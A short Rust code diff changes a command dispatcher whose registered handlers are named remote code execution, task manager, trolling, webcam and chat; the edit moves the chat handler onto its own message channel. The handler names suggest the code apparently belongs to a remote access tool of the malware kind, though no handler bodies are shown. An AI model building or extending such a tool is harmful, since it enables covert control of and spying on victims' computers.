@@ -44,9 +44,12 @@ impl Dispatcher {
             ("RCE", actors::remote_code_execution::RemoteCodeExecution),
             ("TM", actors::task_manager::TaskManager),
             ("TRL", actors::trolling::Trolling),
-            ("WC", actors::webcam::Webcam),
-            ("CH", actors::chat::Chat)
+            ("WC", actors::webcam::Webcam) // ("CH", actors::chat::Chat)
         );
+
+        let (tx, rx) = mpsc::channel(32);
+        senders.insert("CH".to_string(), tx);
+        crate::actors::run_chat_actor(rx, writer.clone());
 
         Self { senders }
     }
